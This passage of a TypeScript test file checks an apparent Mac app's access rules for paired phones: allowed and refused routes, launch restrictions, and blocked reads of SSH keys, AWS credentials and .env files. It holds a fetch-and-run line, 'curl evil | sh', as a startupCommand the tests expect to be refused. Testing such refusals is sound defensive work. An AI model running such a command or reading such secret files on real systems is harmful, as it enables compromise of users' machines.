// test/phoneProfile.test.ts — AASC-28: a paired phone gets session work only. It can't start a free-form command,
// read ~/.ssh, write files, load the workspace or change the Mac's settings; a password sign-in keeps full power.
//
// A remote device is simulated with a forwarding header on a loopback request (AASC-13 treats that as remote).
// No PTY is ever spawned: createTerminal is mocked.
import { EventEmitter } from 'node:events';
import { appendFileSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join } from 'node:path';
import { describe, it, beforeAll, afterAll, beforeEach, expect, vi } from 'vitest';

// The "share new sessions" setting writes its file: keep it out of the repo's data/.
process.env.AASC_SHARE_DEFAULT_FILE = join(mkdtempSync(join(tmpdir(), 'aasc-phone-share-')), 'share-default.json');

vi.mock('../server/db.js', () => ({
  upsertSession: vi.fn(), updateSessionTitle: vi.fn(), updateSessionSummary: vi.fn(), updateSessionRemark: vi.fn(),
  updateSessionArchived: vi.fn(), migrateSessionId: vi.fn(), getPromptsForSession: vi.fn(() => []),
  insertFullPrompt: vi.fn(), getRecentSessions: vi.fn(() => []), getSessionById: vi.fn(() => null),
  deleteSession: vi.fn(), getAllSessionQueues: vi.fn(() => []), default: {},
}));

const pty = vi.hoisted(() => ({
  owner: new Map<string, string>(),
  created: [] as Array<{ command: string; workingDir: string }>,
  autoConfirmTrust: [] as Array<boolean | undefined>,
  fg: new Map<string, string>(),
  write: vi.fn(),
  n: 0,
}));
vi.mock('../server/sshManager.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../server/sshManager.js')>();
  return {
    ...actual,
    createTerminal: vi.fn(async (config: { command: string; workingDir: string; autoConfirmTrust?: boolean }) => {
      pty.created.push({ command: config.command, workingDir: config.workingDir });
      pty.autoConfirmTrust.push(config.autoConfirmTrust);
      return `term-phone-${++pty.n}`;
    }),
    writeWhenReady: vi.fn(),
    maybeInjectUltracode: vi.fn(),
    getTerminals: () => [...pty.owner.keys()].map((terminalId) => ({ terminalId, isOps: terminalId.startsWith('ops-') })),
    setWsClient: (id: string) => pty.owner.has(id),
    removeWsClient: vi.fn(),
    writeToTerminal: pty.write,
    getTerminalSessionId: (id: string) => pty.owner.get(id) ?? null,
    isOpsTerminal: (id: string) => id.startsWith('ops-'),
    getForegroundProcess: (id: string) => pty.fg.get(id) ?? null,
    // No PTY exists here (createTerminal is mocked); a DELETE must never reach a real one.
    closeTerminal: vi.fn(),
  };
});

// apiRouter sweeps the queue-image folder when it loads, and an upload below writes to it:
// keep both off the Mac's own folder.
vi.mock('../server/queueImages.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../server/queueImages.js')>();
  const fs = await import('node:fs');
  const os = await import('node:os');
  const path = await import('node:path');
  return { ...actual, QUEUE_IMAGES_DIR: fs.mkdtempSync(path.join(os.tmpdir(), 'aasc-phone-queue-images-')) };
});

import express from 'express';
import { createServer, type Server } from 'http';
import {
  phoneRuleFor, phoneLaunchRefusal, phoneMayRead, phoneProjectRoot, createPhoneProfile, isAgentProcessName,
  phoneFloatingRefusal, PHONE_UPLOADS_PER_MINUTE, filterPhoneKnownProjects,
} from '../server/mobile/phoneProfile.js';
import { isQueueImageId } from '../server/queueImages.js';

// ── A home folder with a project, an unknown folder and secrets ─────────────────────────────────────────

let tmp = '';
let home = '';
let project = '';
let other = '';
let launchDir = '';
let outside = '';

beforeAll(() => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), 'aasc-phone-')));
  home = join(tmp, 'home');
  project = join(home, 'proj');
  other = join(home, 'other');
  mkdirSync(join(home, '.ssh'), { recursive: true });
  writeFileSync(join(home, '.ssh', 'id_ed25519'), 'PRIVATE');
  mkdirSync(join(project, 'src'), { recursive: true });
  mkdirSync(join(project, '.aws'), { recursive: true });
  writeFileSync(join(project, 'README.md'), '# proj');
  writeFileSync(join(project, '.aws', 'credentials'), 'KEY');
  symlinkSync(join(home, '.ssh'), join(project, 'keys'));
  mkdirSync(other, { recursive: true });
  launchDir = join(home, 'launch');
  mkdirSync(launchDir, { recursive: true });
  // Secret-looking files inside a project, agent config folders, a project
  // literally called "library", and a folder outside the home folder.
  writeFileSync(join(project, '.env'), 'TOKEN=1');
  writeFileSync(join(project, 'server.pem'), 'KEY');
  writeFileSync(join(project, 'id_ed25519'), 'KEY');
  mkdirSync(join(project, '.git'), { recursive: true });
  writeFileSync(join(project, '.git', 'config'), '[remote] url = https://token@host');
  mkdirSync(join(home, '.codex', 'proj'), { recursive: true });
  writeFileSync(join(home, '.codex', 'auth.json'), '{}');
  mkdirSync(join(home, 'Library', 'proj'), { recursive: true });
  mkdirSync(join(home, 'code', 'library'), { recursive: true });
  outside = join(tmp, 'outside');
  mkdirSync(outside, { recursive: true });
});

afterAll(async () => {
  rmSync(tmp, { recursive: true, force: true });
  const { QUEUE_IMAGES_DIR } = await import('../server/queueImages.js');
  if (QUEUE_IMAGES_DIR.includes('aasc-phone-queue-images-')) rmSync(QUEUE_IMAGES_DIR, { recursive: true, force: true });
});

// ── The route table ──────────────────────────────────────────────────────────────────────────────────────

describe('phoneRuleFor', () => {
  it.each([
    ['GET', '/sessions'], ['GET', '/config'], ['GET', '/known-projects'], ['GET', '/presence'],
    ['POST', '/presence/control/claim'], ['GET', '/sessions/abc/transcript'], ['GET', '/sessions/abc/subagents/a1b2/transcript'],
    ['PUT', '/sessions/abc/queue'],
    ['POST', '/sessions/abc/kill'], ['POST', '/sessions/abc/fork'], ['POST', '/sessions/abc/queue/resume'],
    ['PUT', '/sessions/abc/title'], ['GET', '/db/sessions/abc'], ['POST', '/db/sessions/abc/notes'],
    ['PUT', '/db/notes/4'], ['GET', '/note-media/abc'], ['GET', '/agenda'],
    ['GET', '/sessions/abc/queue/sent'], ['POST', '/sessions/abc/queue/sent'],
    ['GET', '/snippets'], ['POST', '/snippets'], ['PATCH', '/snippets/3'], ['DELETE', '/snippets/3'], ['POST', '/snippets/3/use'],
    ['GET', '/rooms'], ['POST', '/rooms/ops'],
    // The phone chat (AASC-41) and what a session edited (AASC-44), behind the /sessions/:id gate.
    ['GET', '/sessions/abc/chat'], ['GET', '/sessions/abc/changes'], ['GET', '/sessions/abc/changes/3'], ['GET', '/sessions/abc/context-breakdown'],
    // AASC Cloud, read-only, through the Mac's connection (AASC-51).
    ['GET', '/phone-cloud/status'], ['GET', '/phone-cloud/browse'], ['GET', '/phone-cloud/resources/abc/versions'],
    // The Mac's agent CLIs (Oct 25 2026): versions, and the fixed `update` command (the router rate-limits).
    ['GET', '/cli-versions'], ['POST', '/cli-versions/claude/update'], ['POST', '/cli-versions/codex/update'],
    // A central's confirmations a phone may answer (P5-15): the route itself checks the phone, the tool and sharing.
    ['GET', '/phone-confirms'], ['POST', '/phone-confirms/3f2a9c1e-0000-4000-8000-000000000000'],
  ])('lets a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBe('allow');
  });

  it('checks terminals, typing, prompts, files, commands, uploads and launches before letting them through', () => {
    expect(phoneRuleFor('GET', '/terminals/t1/output')).toBe('terminal');
    expect(phoneRuleFor('POST', '/terminals/t1/write')).toBe('type');
    expect(phoneRuleFor('POST', '/sessions/abc/prompt')).toBe('prompt');
    expect(phoneRuleFor('GET', '/sessions/abc/prompt/key-00000001')).toBe('allow');
    expect(phoneRuleFor('GET', '/commands')).toBe('commands');
    expect(phoneRuleFor('POST', '/queue-images')).toBe('upload');
    expect(phoneRuleFor('POST', '/sessions/abc/queue/items')).toBe('upload');
    expect(phoneRuleFor('POST', '/db/sessions/abc/note-media')).toBe('upload');
    expect(phoneRuleFor('GET', '/files/read')).toBe('files');
    expect(phoneRuleFor('GET', '/files/resolve')).toBe('files');
    expect(phoneRuleFor('POST', '/terminals')).toBe('launch');
    expect(phoneRuleFor('POST', '/sessions/spawn-floating')).toBe('origin');
  });

  it.each([
    ['GET', '/workspace/load'], ['POST', '/workspace/save'], ['POST', '/workspace/restore-claim'],
    ['POST', '/files/write'], ['POST', '/files/mkdir'], ['POST', '/files/delete'],
    ['POST', '/files/reveal'], ['POST', '/files/open-external'],
    ['POST', '/hooks/install'], ['POST', '/hooks/uninstall'], ['GET', '/hooks/status'],
    ['POST', '/config/terminal-buffer'], ['POST', '/reset'], ['POST', '/hook-stats/reset'],
    ['POST', '/sessions/clear-all'], ['GET', '/ssh-keys'], ['POST', '/tmux-sessions'],
    ['POST', '/sessions/abc/reconnect-ops-terminal'], ['PUT', '/sessions/abc/remote-visible'],
    ['PUT', '/sessions/abc/pinned'], ['POST', '/sessions/abc/summarize'],
    ['GET', '/sessions/history'], ['GET', '/sessions/resume-command'], ['GET', '/sessions/spawn-floating'],
    ['POST', '/terminals/register'], ['POST', '/terminals/t1/prefill-output'],
    ['GET', '/teams/x/config'], ['POST', '/teams/x/members/y/terminal'],
    ['GET', '/db/sessions'], ['GET', '/db/search'], ['GET', '/db/projects'], ['DELETE', '/db/sessions/abc'],
    ['POST', '/snippets/import'],
    ['PUT', '/rooms'], ['GET', '/rooms/ops'], ['DELETE', '/rooms'],
    ['POST', '/sessions/abc/subagents/a1b2/transcript'], ['GET', '/sessions/abc/subagents/a/b/transcript'],
    ['GET', '/sessions/abc/prompt'], ['PUT', '/sessions/abc/prompt'], ['POST', '/sessions/abc/prompt/now'],
    ['POST', '/sessions/abc/chat'], ['DELETE', '/sessions/abc/changes'], ['GET', '/sessions/abc/changes/x'],
    ['GET', '/sessions/abc/changes/3/raw'],
    ['POST', '/phone-cloud/browse'], ['DELETE', '/phone-cloud/status'], ['PUT', '/phone-cloud/resources/abc/versions'],
    ['GET', '/phone-cloud'], ['GET', '/phone-cloud/resources'], ['GET', '/phone-cloud/resources/abc'],
    ['GET', '/phone-cloud/resources/abc/versions/2'], ['GET', '/phone-cloud/projects'],
    ['POST', '/cli-versions/gemini/update'], ['POST', '/cli-versions'], ['DELETE', '/cli-versions'], ['GET', '/cli-versions/codex/update'],
    // /api/mobile is the mobile router's own (mounted ahead of the profile): the phone's backend code
    // checks its session itself, and the desktop's cloud phone list is never a phone's (AASC-52).
    // /paths is the same kind of call (AASC-60): the signed-in phone asks for the Mac's Tailscale address, checking its own session.
    ['POST', '/mobile/backend-code'], ['POST', '/mobile/paths'], ['GET', '/mobile/cloud-phones'], ['POST', '/mobile/cloud-phones/remove-unlinked'],
    // Google sign-in (AASC-61) belongs to the Mac alone: start/cancel sit behind the RESOURCES gate and
    // the callback answers loopback navigations only.
    ['POST', '/resources/cloud/google/start'], ['POST', '/resources/cloud/google/cancel'], ['GET', '/resources/cloud/google/callback'],
    ['GET', '/a-route-added-later'],
    // Central sessions stay this Mac's own (ruling C-M6): nothing under /mcp, and only the two phone-confirm routes.
    ['GET', '/mcp/confirms'], ['POST', '/mcp/confirm/abc'], ['GET', '/mcp/centrals'], ['GET', '/mcp/activity'],
    ['GET', '/mcp/tasks'], ['PUT', '/mcp/sessions/abc/hands-off'],
    ['POST', '/phone-confirms'], ['GET', '/phone-confirms/abc'], ['DELETE', '/phone-confirms/abc'],
    ['POST', '/phone-confirms/abc/allow'], ['PUT', '/phone-confirms/abc'],
  ])('refuses a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBeNull();
  });
});

// ── AI popups (AASC-20) ──────────────────────────────────────────────────────────────────────────────────

describe('phoneFloatingRefusal', () => {
  const deps = {
    isSharedSession: (id: string) => id === 'shared' || id === 'shared-float',
    sessionOfTerminal: (id: string) => ({ 't-shared': 'shared', 't-float': 'shared-float', 't-hidden': 'hidden' } as Record<string, string>)[id] ?? null,
  };

  it('lets a phone ask from a shared session, or from a shared session’s terminal', () => {
    expect(phoneFloatingRefusal({ originSessionId: 'shared', mode: 'explain-native' }, deps)).toBe(false);
    expect(phoneFloatingRefusal({ originSessionId: 'shared', spawnTerminalId: 't-float' }, deps)).toBe(false);
  });

  it('refuses a hidden or unknown origin, a hidden or unknown host terminal, and a malformed body', () => {
    for (const body of [
      { originSessionId: 'hidden' },
      { originSessionId: 'nope' },
      { originSessionId: '' },
      { originSessionId: 7 },
      { originSessionId: 'shared', spawnTerminalId: 't-hidden' },
      { originSessionId: 'shared', spawnTerminalId: 't-orphan' },
      { originSessionId: 'shared', spawnTerminalId: 42 },
      null, [], 'shared',
    ]) {
      expect(phoneFloatingRefusal(body, deps), JSON.stringify(body)).toBe(true);
    }
  });

  // AASC-57: a popup from a project file names the file; the phone may name only one it could read.
  it('lets a popup name a file the phone may read, and refuses any other (or one it can’t check)', () => {
    const mayRead = (p: string) => p.startsWith('/w/shared/') && !p.includes('.env');
    expect(phoneFloatingRefusal({ originSessionId: 'shared', mode: 'translate-file', filePath: '/w/shared/a.md' }, deps, mayRead)).toBe(false);
    expect(phoneFloatingRefusal({ originSessionId: 'shared', mode: 'explain-native', filePath: '' }, deps, mayRead)).toBe(false);
    for (const filePath of ['/w/hidden/a.md', '/w/shared/.env', 42]) {
      expect(phoneFloatingRefusal({ originSessionId: 'shared', mode: 'translate-file', filePath }, deps, mayRead), String(filePath)).toBe(true);
    }
    expect(phoneFloatingRefusal({ originSessionId: 'shared', filePath: '/w/shared/a.md' }, deps)).toBe(true);
    expect(phoneFloatingRefusal({ originSessionId: 'hidden', mode: 'translate-file', filePath: '/w/shared/a.md' }, deps, mayRead)).toBe(true);
  });
});

// ── Answering a waiting request (AASC-43) ────────────────────────────────────────────────────────────────

describe('answering a waiting request from a phone (AASC-43)', () => {
  it('is open on the answer route, under the answer rule', () => {
    expect(phoneRuleFor('POST', '/sessions/abc/requests/toolu_01/answer')).toBe('answer');
    expect(phoneRuleFor('POST', '/sessions/abc/requests/0b9c6a3e-1f2d-4c5b-9a8e-7d6c5b4a3f21/answer/')).toBe('answer');
  });

  it.each([
    ['GET', '/sessions/abc/requests/r1/answer'],
    ['PUT', '/sessions/abc/requests/r1/answer'],
    ['POST', '/sessions/abc/requests/answer'],
    ['POST', '/sessions/abc/requests/r1/answer/again'],
    ['POST', '/sessions/abc/requests/r1/r2/answer'],
    ['GET', '/sessions/abc/requests'],
  ])('stays closed for %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBeNull();
  });

  // The rule alone, in front of a stand-in route: the route's own checks are in requestAnswerRoute.test.ts.
  const fg = new Map<string, string>();
  const terminalOf: Record<string, string> = { shared: 't-shared', hidden: 't-hidden' };
  let tiny: Server;
  let tinyBase = '';

  beforeAll(async () => {
    const auth = await import('../server/authManager.js');
    const app = express();
    app.use(express.json());
    app.use('/api', createPhoneProfile({
      phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
      sharedProjectPaths: () => [],
      knownProjectPaths: () => [],
      isOpsTerminal: (id) => id.startsWith('ops-'),
      isSharedSession: (id) => id === 'shared' || id === 'shared-no-terminal',
      sessionOfTerminal: () => null,
      terminalOfSession: (id) => terminalOf[id] ?? null,
      foregroundProcess: (id) => fg.get(id) ?? null,
      home,
    }), (_req, res) => { res.status(202).json({ reached: true }); });
    tiny = createServer(app);
    await new Promise<void>((r) => tiny.listen(0, '127.0.0.1', r));
    const addr = tiny.address();
    if (addr && typeof addr === 'object') tinyBase = `http://127.0.0.1:${addr.port}`;
  });

  afterAll(async () => {
    await new Promise<void>((r) => tiny.close(() => r()));
  });

  async function post(sessionId: string) {
    const auth = await import('../server/authManager.js');
    const res = await fetch(`${tinyBase}/api/sessions/${sessionId}/requests/toolu_1/answer`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.168.1.80', Authorization: `Bearer ${auth.createToken('dev-phone-answer')}` },
      body: JSON.stringify({ choice: 'allow_once' }),
    });
    return { status: res.status, json: await res.json().catch(() => ({})) as Record<string, unknown> };
  }

  it('lets the answer through while the agent is the session terminal’s foreground program', async () => {
    fg.set('t-shared', 'claude');
    expect(await post('shared')).toEqual({ status: 202, json: { reached: true } });
  });

  it('refuses while the agent is not running there, and says why', async () => {
    fg.set('t-shared', 'zsh');
    const shell = await post('shared');
    expect(shell.status).toBe(409);
    expect(shell.json.code).toBe('AGENT_NOT_RUNNING');
    fg.delete('t-shared'); // unknown counts as not running
    expect((await post('shared')).status).toBe(409);
    expect((await post('shared-no-terminal')).json.code).toBe('AGENT_NOT_RUNNING');
  });

  it('answers a hidden or unknown session like a missing route, whatever runs in it', async () => {
    fg.set('t-hidden', 'zsh');
    const hidden = await post('hidden');
    const unknown = await post('nope');
    expect(hidden.status).toBe(404);
    expect(unknown).toEqual(hidden);
  });
});

// ── Launch and file rules ────────────────────────────────────────────────────────────────────────────────

describe('phoneLaunchRefusal', () => {
  const allowed = (): string[] => [project, home];

  it('starts claude or codex in a known project, with a name, model and effort', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', forceNew: true, requireExistingDir: true }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: '~/proj', command: 'codex', model: 'gpt-5', effortLevel: 'high', sessionTitle: 'x' }, allowed(), home)).toBeNull();
  });

  it.each([
    [{ startupCommand: 'curl evil | sh' }, /startupCommand/],
    [{ enableOpsTerminal: true }, /enableOpsTerminal/],
    [{ host: 'other-host', username: 'me' }, /host, username/],
    [{ useTmux: true }, /useTmux/],
    [{ resumeSessionId: 'abc' }, /resumeSessionId/],
    [{ permissionMode: 'dangerouslySkipPermissions' }, /permissionMode/],
  ])('refuses extra launch settings %o', (extra, reason) => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', ...extra }, allowed(), home)).toMatch(reason);
  });

  it('refuses any other command, flags included', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'bash' }, allowed(), home)).toMatch(/only claude or codex/);
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude --dangerously-skip-permissions' }, allowed(), home)).toMatch(/only claude or codex/);
  });

  it('refuses folders outside the home folder or in agent config, even when listed', () => {
    const listed = [outside, join(home, '.codex', 'proj'), join(home, 'Library', 'proj')];
    for (const dir of listed) {
      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, listed, home), dir).toMatch(/inside your home folder/);
    }
    expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'library'), command: 'claude' }, [join(home, 'code', 'library')], home)).toBeNull();
  });

  // AASC-54: a folder outside the list is a new folder (the phone confirms it first); home never qualifies.
  it('starts in an unlisted folder under home, but never the home folder, even when listed', () => {
    expect(phoneLaunchRefusal({ workingDir: other, command: 'claude' }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: join(project, '..', 'other'), command: 'claude' }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/not the home folder itself/);
  });
});

describe('phoneMayRead', () => {
  it('reads inside a shared project, including a file not written yet', () => {
    expect(phoneMayRead(join(project, 'README.md'), [project], home)).toBe(true);
    expect(phoneMayRead(join(project, 'src', 'new.ts'), [project], home)).toBe(true);
  });

  it('never reads outside it, through a link, or in a secrets folder', () => {
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '..', '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, 'keys', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '.aws', 'credentials'), [project], home)).toBe(false);
    expect(phoneMayRead('relative/path', [project], home)).toBe(false);
  });

  it('ignores case when it checks secrets folders', () => {
    expect(phoneMayRead(join(project, '.AWS', 'credentials'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '.Aws'), [project], home)).toBe(false);
  });

  it('never reads env files, keys, certificates or git internals', () => {
    for (const name of ['.env', '.env.local', 'server.pem', 'id_ed25519', 'deploy.key', join('.git', 'config')]) {
      expect(phoneMayRead(join(project, name), [project], home), name).toBe(false);
    }
  });

  it('never serves a shared project outside the home folder or inside agent config', () => {
    expect(phoneMayRead(join(outside, 'x.txt'), [outside], home)).toBe(false);
    expect(phoneMayRead(join(home, '.codex', 'auth.json'), [join(home, '.codex')], home)).toBe(false);
    expect(phoneMayRead(join(home, '.codex', 'proj', 'a.md'), [join(home, '.codex', 'proj')], home)).toBe(false);
  });

  it('serves nothing from a session that runs in the home folder or at /', () => {
    expect(phoneProjectRoot(home, home)).toBeNull();
    expect(phoneProjectRoot('/', home)).toBeNull();
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [home], home)).toBe(false);
    expect(phoneMayRead(join(home, 'proj', 'README.md'), [home], home)).toBe(false);
  });
});

// ── Through the real API router, with real session tokens ─────────────────────────────────────────────

let server: Server;
let base = '';
let store: typeof import('../server/sessionStore.js');
const PHONE: Record<string, string> = { 'X-Forwarded-For': '192.168.1.60', 'X-AASC-Client-Id': 'phone-a' };
const IPAD: Record<string, string> = { 'X-Forwarded-For': '192.168.1.61', 'X-AASC-Client-Id': 'ipad-a' };
// A second paired phone, with its own per-minute terminal budget (the AASC-57 popup tests open several).
const PHONE_B: Record<string, string> = { 'X-Forwarded-For': '192.168.1.62', 'X-AASC-Client-Id': 'phone-b' };

beforeAll(async () => {
  store = await import('../server/sessionStore.js');
  const auth = await import('../server/authManager.js');
  PHONE.Authorization = `Bearer ${auth.createToken('dev-phone-a')}`;
  PHONE_B.Authorization = `Bearer ${auth.createToken('dev-phone-b')}`;
  IPAD.Authorization = `Bearer ${auth.createToken()}`;
  const { filterVisibleSessions } = await import('../server/sessionVisibility.js');
  await store.createTerminalSession('ph-shared', { host: 'localhost', workingDir: project, command: 'claude' });
  await store.createTerminalSession('ph-hidden', { host: 'localhost', workingDir: other, command: 'claude' });
  store.setSessionRemoteVisible('ph-shared', true);
  pty.owner.set('t-shared', 'ph-shared');
  pty.owner.set('ops-shared', 'ph-shared');
  pty.owner.set('t-hidden', 'ph-hidden');

  const app = express();
  app.use(express.json());
  app.use('/api', createPhoneProfile({
    phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
    sharedProjectPaths: () => Object.values(filterVisibleSessions(false, store.getAllSessions())).map((s) => s.projectPath),
    knownProjectPaths: () => [project, other, launchDir, home],
    isOpsTerminal: (id) => id.startsWith('ops-'),
    isSharedSession: (id) => store.getSession(id)?.remoteVisible === true,
    sessionOfTerminal: (id) => pty.owner.get(id) ?? null,
    terminalOfSession: (id) => store.getSession(id)?.terminalId ?? null,
    foregroundProcess: (id) => pty.fg.get(id) ?? null,
    home,
  }));
  const { default: apiRouter } = await import('../server/apiRouter.js');
  app.use('/api', apiRouter);
  server = createServer(app);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const addr = server.address();
  if (addr && typeof addr === 'object') base = `http://127.0.0.1:${addr.port}`;
});

afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

beforeEach(() => {
  pty.created.length = 0;
  pty.write.mockClear();
  pty.fg.clear();
});

async function call(method: string, path: string, headers: Record<string, string>, body?: unknown) {
  const res = await fetch(`${base}/api${path}`, {
    method,
    headers: { ...(body !== undefined && { 'Content-Type': 'application/json' }), ...headers },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  return { status: res.status, json: await res.json().catch(() => ({})) as Record<string, unknown> };
}

const q = (o: Record<string, string>): string => new URLSearchParams(o).toString();

// Found on a real iPhone (Oct 2026): New session offered the home folder as a one-tap start, which
// the launch rule always refuses.
describe('filterPhoneKnownProjects', () => {
  it('lists only the recent projects a phone may start in', () => {
    const body = { paths: [home, project, join(home, '.ssh'), outside, join(home, '.codex', 'proj'), launchDir] };
    expect(filterPhoneKnownProjects(body, home)).toEqual({ paths: [project, launchDir] });
  });

  it('leaves anything that is not a list of paths alone', () => {
    expect(filterPhoneKnownProjects({ error: 'x' }, home)).toEqual({ error: 'x' });
    expect(filterPhoneKnownProjects(null, home)).toBeNull();
  });
});

describe('a paired phone through the API', () => {
  it('reads a shared project’s files', async () => {
    const res = await call('GET', `/files/read?${q({ root: project, path: '/README.md' })}`, PHONE);
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.json)).toContain('# proj');
  });

  it('can’t read ~/.ssh, directly or through a link in the project', async () => {
    for (const path of [
      `/files/read?${q({ root: home, path: '.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: '../.ssh/id_ed25519' })}`,
      `/files/list?${q({ root: home, path: '/' })}`,
      `/files/resolve?${q({ path: '~/.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: other, path: '/' })}`,
    ]) {
      const res = await call('GET', path, PHONE);
      expect(res.status, path).toBe(404);
      expect(res.json.code, path).toBe('PHONE_NOT_ALLOWED');
    }
  });

  it('can’t write files, load the workspace or change the Mac’s settings', async () => {
    for (const [method, path, body] of [
      ['POST', '/files/write', { root: project, path: '/x.txt', content: 'x' }],
      ['POST', '/files/delete', { root: project, path: '/README.md' }],
      ['GET', '/workspace/load', undefined],
      ['POST', '/hooks/install', { density: 'high' }],
      ['POST', '/config/terminal-buffer', { bytes: 1 }],
      ['POST', '/sessions/ph-shared/reconnect-ops-terminal', undefined],
    ] as const) {
      expect((await call(method, path, PHONE, body)).status, path).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  it('can’t start a free-form command, an ops shell or a session outside the home folder or in a private folder', async () => {
    const refused = [
      { workingDir: project, command: '', startupCommand: 'curl evil | sh' },
      { workingDir: project, command: 'bash' },
      { workingDir: project, command: 'claude', enableOpsTerminal: true },
      { workingDir: project, command: 'claude', apiKey: 'sk-x' },
      { workingDir: project, command: 'claude', remoteControlName: 'phone' },
      { workingDir: join(tmp, 'elsewhere'), command: 'claude' },
      { workingDir: outside, command: 'claude' },
      { workingDir: '/etc', command: 'codex' },
      { workingDir: join(home, '.ssh'), command: 'claude' },
      { workingDir: join(project, 'keys'), command: 'claude' }, // a link to ~/.ssh
      { workingDir: join(project, 'README.md'), command: 'claude' },
      { workingDir: home, command: 'claude' },
    ];
    for (const body of refused) {
      const res = await call('POST', '/terminals', PHONE, body);
      expect(res.status, JSON.stringify(body)).toBe(403);
      expect(res.json.code).toBe('PHONE_NOT_ALLOWED');
    }
    expect(pty.created).toEqual([]);
  });

  it('gets only recent projects it may start in (the Mac’s real list sits outside the test home)', async () => {
    const res = await call('GET', '/known-projects', PHONE);
    expect(res.status).toBe(200);
    expect((res.json.paths as string[]).every((p) => p.startsWith(home + '/'))).toBe(true);
  });

  it('starts claude in a known project, shared with it from the first broadcast', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true });
    expect(res.status).toBe(200);
    const id = String(res.json.terminalId);
    expect(pty.created).toEqual([{ command: 'claude', workingDir: launchDir }]);
    expect(store.getSession(id)?.remoteVisible).toBe(true);
    // The card keeps the flag when Claude's first hook re-keys it.
    await store.handleEvent({ session_id: 'phone-launched-uuid', hook_event_name: 'SessionStart', agent_terminal_id: id, cwd: launchDir, tty_path: '/dev/ttys901' } as never);
    expect(store.getSession('phone-launched-uuid')?.remoteVisible).toBe(true);
  });

  // AASC-54: a folder no agent has used yet (the phone asked "Start in a new folder?" first).
  it('starts claude and codex in a never-used folder, shared with it, in the folder it checked', async () => {
    const fresh = join(home, 'brand-new');
    mkdirSync(fresh, { recursive: true });
    for (const command of ['claude', 'codex']) {
      pty.created.length = 0;
      pty.autoConfirmTrust.length = 0;
      const res = await call('POST', '/terminals', PHONE, { workingDir: '~/brand-new', command, forceNew: true });
      expect(res.status, command).toBe(200);
      expect(pty.created, command).toEqual([{ command, workingDir: fresh }]);
      expect(store.getSession(String(res.json.terminalId))?.remoteVisible, command).toBe(true);
      // Its folder-trust prompt is the phone's to answer: the dashboard doesn't confirm it,
      // and the session keeps that for a restart, resume or fork (they relaunch from sshConfig).
      expect(pty.autoConfirmTrust, command).toEqual([false]);
      expect(store.getSession(String(res.json.terminalId))?.sshConfig?.autoConfirmTrust, command).toBe(false);
    }
  });

  it('keeps confirming Claude’s trust prompt in a known project, and never falls back to home for a gone folder', async () => {
    pty.autoConfirmTrust.length = 0;
    expect((await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true })).status).toBe(200);
    expect(pty.autoConfirmTrust).toEqual([undefined]);
    pty.autoConfirmTrust.length = 0;
    expect((await call('POST', '/terminals', {}, { workingDir: join(home, 'brand-new'), command: 'claude', forceNew: true })).status).toBe(200);
    expect(pty.autoConfirmTrust).toEqual([undefined]); // the Mac's own launch: unchanged
  });

  it('starts the Mac’s own launch in a new folder hidden from remote devices', async () => {
    const res = await call('POST', '/terminals', {}, { workingDir: other, command: 'claude', forceNew: true });
    expect(res.status).toBe(200);
    expect(store.getSession(String(res.json.terminalId))?.remoteVisible).not.toBe(true);
  });

  // A workspace restore re-creates a shared session through this route; without the flag every share
  // was lost on each AASC restart (found on a real iPhone, Oct 2026).
  // Oct 2026, by request: "Share new sessions with my devices", on the Mac only.
  it('lets only the Mac read and change the share-new-sessions default', async () => {
    expect((await call('GET', '/sharing-default', {})).json).toEqual({ ok: true, shareNewSessions: false });
    expect((await call('PUT', '/sharing-default', PHONE, { shareNewSessions: true })).status).toBe(404);
    expect((await call('PUT', '/sharing-default', {}, { shareNewSessions: 'yes' })).status).toBe(400);
    expect((await call('PUT', '/sharing-default', {}, { shareNewSessions: true })).json).toEqual({ ok: true, shareNewSessions: true });
    const fresh = await call('POST', '/terminals', {}, { workingDir: other, command: 'claude', forceNew: true });
    expect(store.getSession(String(fresh.json.terminalId))?.remoteVisible).toBe(true);
    expect((await call('PUT', '/sharing-default', {}, { shareNewSessions: false })).json.shareNewSessions).toBe(false);
  });

  it('shares every open session at once from the Mac, never from a phone', async () => {
    await store.createTerminalSession('ph-share-all', { host: 'localhost', workingDir: other, command: 'claude' });
    const wereHidden = Object.values(store.getAllSessions()).filter((s) => s.remoteVisible !== true).map((s) => s.sessionId);
